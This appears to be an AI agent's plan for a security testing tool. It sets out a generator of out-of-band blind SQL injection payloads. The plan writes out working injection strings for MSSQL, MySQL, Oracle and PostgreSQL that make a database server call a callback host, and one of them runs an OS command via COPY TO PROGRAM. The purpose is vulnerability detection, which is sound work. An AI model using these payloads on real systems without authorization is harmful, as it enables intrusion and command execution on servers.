---
phase: 06-vulnerability-payloads
plan: 02
type: execute
wave: 1
depends_on: []
files_modified:
  - ricochet/payloads/sqli.py
  - ricochet/payloads/builtin/sqli-dns-mssql.txt
  - ricochet/payloads/builtin/sqli-dns-mysql.txt
  - ricochet/payloads/builtin/sqli-dns-oracle.txt
  - ricochet/payloads/builtin/sqli-dns-postgres.txt
autonomous: true

must_haves:
  truths:
    - "SQLi payloads use database-specific OOB techniques (xp_dirtree, LOAD_FILE, UTL_HTTP, dblink)"
    - "Each major database has at least 2 payload variants"
    - "Payloads trigger DNS or HTTP callbacks from database server"
  artifacts:
    - path: "ricochet/payloads/sqli.py"
      provides: "SQLi OOB payload generator class"
      exports: ["SQLiPayloadGenerator"]
    - path: "ricochet/payloads/builtin/sqli-dns-mssql.txt"
      provides: "MSSQL OOB payloads using xp_dirtree/xp_fileexist"
      min_lines: 2
    - path: "ricochet/payloads/builtin/sqli-dns-mysql.txt"
      provides: "MySQL OOB payloads using LOAD_FILE"
      min_lines: 2
    - path: "ricochet/payloads/builtin/sqli-dns-oracle.txt"
      provides: "Oracle OOB payloads using UTL_HTTP/UTL_INADDR"
      min_lines: 2
    - path: "ricochet/payloads/builtin/sqli-dns-postgres.txt"
      provides: "PostgreSQL OOB payloads using dblink/COPY"
      min_lines: 2
  key_links:
    - from: "ricochet/payloads/sqli.py"
      to: "ricochet/payloads/builtin/sqli-dns-*.txt"
      via: "load_payloads with database-specific files"
      pattern: "sqli-dns-"
---

<objective>
Create SQLi OOB payload generator for blind SQL injection detection

Purpose: Generate SQL injection payloads that trigger out-of-band callbacks via database-specific features. These payloads work for blind SQLi where no in-band error messages are visible - the callback proves code execution on the database server.

Output: SQLiPayloadGenerator class + 8 SQLi OOB payloads (2 per major database)
</objective>

<execution_context>
@~/.claude/get-shit-done/workflows/execute-plan.md
@~/.claude/get-shit-done/templates/summary.md
</execution_context>

<context>
@.planning/PROJECT.md
@.planning/ROADMAP.md
@.planning/STATE.md
@.planning/phases/06-vulnerability-payloads/06-RESEARCH.md

@ricochet/injection/payloads.py
</context>

<tasks>

<task type="auto">
  <name>Task 1: Create SQLi OOB builtin payload files</name>
  <files>
    ricochet/payloads/builtin/sqli-dns-mssql.txt
    ricochet/payloads/builtin/sqli-dns-mysql.txt
    ricochet/payloads/builtin/sqli-dns-oracle.txt
    ricochet/payloads/builtin/sqli-dns-postgres.txt
  </files>
  <action>
Create 4 database-specific payload files with 2 payloads each:

1. `sqli-dns-mssql.txt` - MSSQL out-of-band via xp_dirtree:
```
# MSSQL OOB payloads - requires sysadmin role
# {{CALLBACK}} replaced with DNS-resolvable callback domain
'; master..xp_dirtree '\\{{CALLBACK}}\x'; --
' master..xp_dirtree '\\{{CALLBACK}}\x'; --
```

2. `sqli-dns-mysql.txt` - MySQL out-of-band via LOAD_FILE:
```
# MySQL OOB payloads - requires FILE privilege
# {{CALLBACK}} replaced with DNS-resolvable callback domain
' AND LOAD_FILE(CONCAT('\\\\{{CALLBACK}}\\x'))--
1 AND LOAD_FILE(CONCAT('\\\\{{CALLBACK}}\\x'))--
```

3. `sqli-dns-oracle.txt` - Oracle out-of-band via UTL_HTTP:
```
# Oracle OOB payloads - requires UTL_HTTP permission
# {{CALLBACK}} replaced with callback URL (HTTP-based)
' || UTL_HTTP.REQUEST('http://{{CALLBACK}}') || '
' || UTL_INADDR.GET_HOST_ADDRESS('{{CALLBACK}}') || '
```

4. `sqli-dns-postgres.txt` - PostgreSQL out-of-band via dblink:
```
# PostgreSQL OOB payloads - requires superuser or dblink extension
# {{CALLBACK}} replaced with callback host
'; SELECT dblink_connect('host={{CALLBACK}} dbname=x'); --
'; COPY (SELECT '') TO PROGRAM 'nslookup {{CALLBACK}}'; --
```

Note: Preserve trailing spaces and exact escaping from research - these are tested payloads.
  </action>
  <verify>
```bash
wc -l ricochet/payloads/builtin/sqli-dns-*.txt
```
Each file should have 4+ lines (2 comments + 2 payloads minimum).
  </verify>
  <done>
- 4 database-specific payload files created
- Each has minimum 2 working OOB payloads
- Comments explain privilege requirements
  </done>
</task>

<task type="auto">
  <name>Task 2: Create SQLi payload generator with database selection</name>
  <files>
    ricochet/payloads/sqli.py
    tests/test_payloads_sqli.py
  </files>
  <action>
Create SQLiPayloadGenerator class:

```python
class SQLiPayloadGenerator:
    vuln_type = "sqli"
    DATABASES = ["mssql", "mysql", "oracle", "postgres"]

    def __init__(self, database: Optional[str] = None):
        """
        Args:
            database: Specific database to target (mssql, mysql, oracle, postgres).
                     If None, generates payloads for all databases.
        """
        self.database = database

    def generate(self, callback_url: str) -> Iterator[tuple[str, str]]:
        """Yield (payload, database) tuples."""
        builtin_dir = Path(__file__).parent / "builtin"

        databases = [self.database] if self.database else self.DATABASES

        for db in databases:
            filepath = builtin_dir / f"sqli-dns-{db}.txt"
            if filepath.exists():
                for payload in load_payloads(filepath):
                    yield (payload, db)
```

Also create tests in `tests/test_payloads_sqli.py`:
- Test generates payloads for all databases when no db specified
- Test generates only specific database payloads when db specified
- Test all payloads contain {{CALLBACK}} placeholder
- Test vuln_type returns "sqli"
- Test minimum 8 total payloads (2 per database)
  </action>
  <verify>
```bash
python -c "from ricochet.payloads.sqli import SQLiPayloadGenerator; g = SQLiPayloadGenerator(); print(list(g.generate('http://test'))[:4])"
python -m pytest tests/test_payloads_sqli.py -v
```
  </verify>
  <done>
- SQLiPayloadGenerator class importable
- Generates payloads for all 4 databases
- Database-specific filtering works
- Tests pass
  </done>
</task>

</tasks>

<verification>
```bash
# Payload files exist with content
ls -la ricochet/payloads/builtin/sqli-dns-*.txt

# Generator produces payloads for all databases
python -c "from ricochet.payloads.sqli import SQLiPayloadGenerator; g = SQLiPayloadGenerator(); payloads = list(g.generate('http://test')); print(f'{len(payloads)} SQLi payloads across databases'); dbs = set(p[1] for p in payloads); print(f'Databases: {dbs}')"

# Database-specific mode works
python -c "from ricochet.payloads.sqli import SQLiPayloadGenerator; g = SQLiPayloadGenerator('mssql'); payloads = list(g.generate('http://test')); assert all(p[1] == 'mssql' for p in payloads); print(f'{len(payloads)} MSSQL payloads')"

# Tests pass
python -m pytest tests/test_payloads_sqli.py -v
```
</verification>

<success_criteria>
- SQLiPayloadGenerator class exists with database parameter
- Generates at least 8 SQLi OOB payloads (2 per database)
- All payloads contain {{CALLBACK}} placeholder
- Database-specific filtering works correctly
- vuln_type property returns "sqli"
- Tests verify generator behavior
</success_criteria>

<output>
After completion, create `.planning/phases/06-vulnerability-payloads/06-02-SUMMARY.md`
</output>
